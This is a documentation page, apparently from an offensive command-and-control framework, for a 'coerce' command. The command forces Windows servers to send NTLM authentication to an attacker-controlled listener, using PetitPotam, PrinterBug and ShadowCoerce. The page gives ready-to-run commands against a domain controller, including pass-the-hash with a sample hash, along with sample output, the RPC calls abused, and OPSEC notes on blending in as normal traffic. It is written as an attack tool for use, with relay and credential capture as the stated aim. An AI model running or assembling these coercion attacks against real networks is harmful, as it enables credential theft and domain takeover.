+++
title = "coerce"
chapter = false
weight = 149
hidden = false
+++

## Summary

NTLM authentication coercion — forces a target server to authenticate to an attacker-controlled listener. Used for NTLM relay attacks and credential capture via tools like Responder, ntlmrelayx, or krbrelayx.

Supports three coercion protocols:

- **PetitPotam (MS-EFSR)**: Abuses the Encrypting File System Remote Protocol via `EfsRpcOpenFileRaw` on the `\pipe\lsarpc` named pipe
- **PrinterBug (MS-RPRN)**: Abuses the Print System Remote Protocol via `RpcRemoteFindFirstPrinterChangeNotification` through the Endpoint Mapper
- **ShadowCoerce (MS-FSRVP)**: Abuses the File Server Remote VSS Protocol via `IsPathShadowCopied` on the `\pipe\FssagentRpc` named pipe

Cross-platform — works from Windows, Linux, and macOS agents. Supports pass-the-hash authentication.

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| server | Yes | Target server to coerce (IP or hostname) |
| listener | Yes | Attacker-controlled host to receive NTLM authentication (e.g., Responder/ntlmrelayx host) |
| method | No | Coercion method: `petitpotam`, `printerbug`, `shadowcoerce`, or `all` (default: `all`) |
| username | Yes | Account for RPC authentication (`DOMAIN\user` or `user@domain`) |
| password | No* | Password (*required unless hash is provided) |
| hash | No* | NT hash for pass-the-hash (LM:NT or just NT) |
| domain | No | Domain name (auto-detected from username format) |
| timeout | No | Operation timeout in seconds (default: 30) |

## Usage

### PetitPotam against a Domain Controller
```
coerce -server dc01.corp.local -listener 10.0.0.5 -method petitpotam -username CORP\user -password P@ssw0rd
```

### PrinterBug with pass-the-hash
```
coerce -server 192.168.1.1 -listener 10.0.0.5 -method printerbug -username admin@corp.local -hash aad3b435b51404ee:8846f7eaee8fb117
```

### Try all methods
```
coerce -server dc01 -listener 10.0.0.5 -method all -username user@domain.local -password pass
```

## Output

```
[*] NTLM coercion against 192.168.1.1 → 10.0.0.5 (password)
[*] Credentials: CORP\user
------------------------------------------------------------
[+] PetitPotam (MS-EFSR): EfsRpcOpenFileRaw via \\192.168.1.1\pipe\lsarpc (path: \\10.0.0.5\share\file.txt) [response: ERROR_ACCESS_DENIED]
[+] PrinterBug (MS-RPRN): RpcRemoteFindFirstPrinterChangeNotification (listener: \\10.0.0.5) [response: RPC_S_SERVER_UNAVAILABLE]
[-] ShadowCoerce (MS-FSRVP): connection failed (service may not be running)
------------------------------------------------------------
[*] 2/3 methods succeeded
[*] Check your listener for incoming NTLM authentication
```

**Interpreting results:**
- `[+]` with `ERROR_ACCESS_DENIED` or `RPC_S_SERVER_UNAVAILABLE` = **coercion triggered** (target tried to authenticate to listener)
- `[-]` with "service may not be running" = target doesn't have that service (normal for FSRVP on non-file-servers)

## Protocol Details

### PetitPotam (MS-EFSR)
Connects via SMB named pipe `\pipe\lsarpc` (fallback from `\pipe\efsrpc`). Calls `EfsRpcOpenFileRaw` with a UNC path pointing to the listener, causing the target to authenticate via NTLM to resolve the path.

### PrinterBug (MS-RPRN)
Connects via TCP using the Endpoint Mapper (port 135). Opens the target's print spooler with `RpcOpenPrinter`, then calls `RpcRemoteFindFirstPrinterChangeNotification` with the listener as the notification target. The Print Spooler service authenticates to the listener.

### ShadowCoerce (MS-FSRVP)
Connects via SMB named pipe `\pipe\FssagentRpc`. Calls `IsPathShadowCopied` with a UNC path pointing to the listener. Requires the File Server VSS Agent service (typically only on file servers).

## OPSEC Considerations

- **Network traffic**: SMB (port 445) for PetitPotam/ShadowCoerce, RPC (port 135 + dynamic) for PrinterBug
- **Event logs**: EFS and Print Spooler operations may generate event logs on the target
- **Service requirements**: PrinterBug requires Print Spooler service (running by default on most Windows). ShadowCoerce requires File Server VSS Agent (often disabled on DCs).
- **Authentication**: Uses standard NTLM authentication to the target — appears as a normal RPC connection
- **Recommended**: Run a listener (Responder, ntlmrelayx) before triggering coercion to capture/relay the NTLM authentication

## MITRE ATT&CK Mapping

- T1187 — Forced Authentication
